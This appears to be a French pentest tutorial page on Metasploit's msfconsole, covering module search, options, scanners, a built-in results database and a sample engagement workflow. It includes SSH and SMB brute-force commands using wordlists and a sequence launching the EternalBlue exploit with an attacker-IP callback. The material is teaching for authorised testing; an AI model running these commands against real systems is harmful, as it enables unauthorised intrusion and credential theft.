# Msfconsole et modules

Msfconsole est l'interface principale du Metasploit Framework. C'est un shell interactif qui donne acces a l'ensemble des modules, des bases de donnees, et des sessions. Maitriser msfconsole, c'est maitriser Metasploit.

## Pourquoi

L'interface graphique Armitage ou l'API REST existent, mais msfconsole reste l'outil de reference. Il offre le controle le plus fin sur les modules, les options, et les sessions. En pentest, la rapidite d'execution passe par la maitrise des commandes.

## Comment ca marche

### Navigation et recherche

```bash
# - Rechercher des modules
msf6 > search eternalblue
msf6 > search type:exploit platform:linux apache
msf6 > search cve:2021-44228

# - Filtrer par type
msf6 > search type:auxiliary smb
msf6 > search type:post windows gather

# - Selectionner et inspecter un module
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010_eternalblue) > info
msf6 exploit(ms17_010_eternalblue) > options
msf6 exploit(ms17_010_eternalblue) > show targets
msf6 exploit(ms17_010_eternalblue) > show payloads
```

### Options et variables

```bash
# - Configurer les options du module
msf6 > set RHOSTS 172.16.5.0/24   # cible(s)
msf6 > set LHOST <IP_ATTAQUANT>    # notre IP pour le callback
msf6 > set LPORT 4444              # port de callback

# - Variables globales (persistent entre les modules)
msf6 > setg RHOSTS 172.16.5.0/24
msf6 > setg LHOST <IP_ATTAQUANT>

# - Voir les options avancees
msf6 > show advanced

# - Reinitialiser
msf6 > unset RHOSTS
msf6 > unset all
```

### Modules auxiliaires utiles

{% tabs %}
{% tab title="Scan" %}
```bash
# - Scanner les versions SMB
use auxiliary/scanner/smb/smb_version
set RHOSTS 172.16.5.0/24
run

# - Scanner les ports
use auxiliary/scanner/portscan/tcp
set RHOSTS 172.16.5.5
set PORTS 1-1024
run

# - Enumeration HTTP
use auxiliary/scanner/http/http_version
set RHOSTS 172.16.5.0/24
run
```
{% endtab %}
{% tab title="Brute force" %}
```bash
# - Brute force SSH
use auxiliary/scanner/ssh/ssh_login
set RHOSTS <IP_CIBLE>
set USERNAME root
set PASS_FILE /opt/wordlists/rockyou.txt
run

# - Brute force SMB
use auxiliary/scanner/smb/smb_login
set RHOSTS <IP_CIBLE>
set SMBUser administrator
set PASS_FILE /opt/wordlists/passwords.txt
run
```
{% endtab %}
{% tab title="Enumeration" %}
```bash
# - Enumeration SMB shares
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS <IP_CIBLE>
run

# - Enumeration SNMP
use auxiliary/scanner/snmp/snmp_enum
set RHOSTS <IP_CIBLE>
run
```
{% endtab %}
{% endtabs %}

### Base de donnees integree

```bash
# - Initialiser la base de donnees
sudo msfdb init

# - Verifier le statut
msf6 > db_status

# - Gerer les workspaces
msf6 > workspace                # lister
msf6 > workspace -a projet_X   # creer
msf6 > workspace projet_X      # basculer

# - Scanner et stocker les resultats
msf6 > db_nmap -sC -sV 172.16.5.0/24

# - Consulter les donnees
msf6 > hosts                   # hotes decouverts
msf6 > services                # services identifies
msf6 > creds                   # credentials trouves
msf6 > vulns                   # vulnerabilites detectees
msf6 > loot                    # fichiers recuperes

# - Importer des resultats externes
msf6 > db_import /path/to/nmap_scan.xml
```

{% hint style="success" %}
La base de donnees est un atout majeur de Metasploit. Elle permet de stocker tous les resultats de scan, les credentials trouves, et les sessions. Sur un pentest avec beaucoup de cibles, `hosts`, `services` et `creds` deviennent indispensables pour garder une vue d'ensemble.
{% endhint %}

### Plugins

```bash
# - Charger un plugin
msf6 > load nessus
msf6 > load openvas

# - Lister les plugins disponibles
msf6 > load -l
```

## En pratique

```bash
# Workflow de scan complet avec Metasploit

# 1 - Creer un workspace
workspace -a client_inlane

# 2 - Scanner avec db_nmap
db_nmap -sC -sV -p- 172.16.5.5

# 3 - Voir les services decouverts
services -p 445

# 4 - Chercher un exploit adapte
search type:exploit smb name:ms17

# 5 - Configurer et lancer
use 0
set RHOSTS 172.16.5.5
set LHOST <IP_ATTAQUANT>
run

# 6 - Verifier les sessions
sessions
```

## Pieges et galeres

- **Module qui echoue** : un echec ne signifie pas que la cible n'est pas vulnerable. L'exploit peut necessiter une adaptation (target, payload, options avancees)
- **LHOST incorrect** : si le callback ne fonctionne pas, verifier que LHOST pointe vers l'interface reseau correcte (pas localhost, pas l'interface VPN si on est en interne)
- **Base de donnees non initialisee** : beaucoup de fonctionnalites (workspace, hosts, services) necessitent la base PostgreSQL. Toujours faire `msfdb init` avant de commencer
- **Trop de resultats search** : utiliser les filtres `type:`, `platform:`, `cve:`, `name:` pour affiner

## Memo express

| Commande | Usage |
|---|---|
| `search type:exploit platform:windows smb` | Recherche filtree |
| `use <module>` | Selectionner un module |
| `info` | Details du module |
| `options` | Options configurables |
| `set / setg` | Configurer local / global |
| `db_nmap` | Scan Nmap avec stockage BDD |
| `hosts / services / creds` | Consulter les donnees BDD |
| `workspace -a <nom>` | Creer un workspace |

***
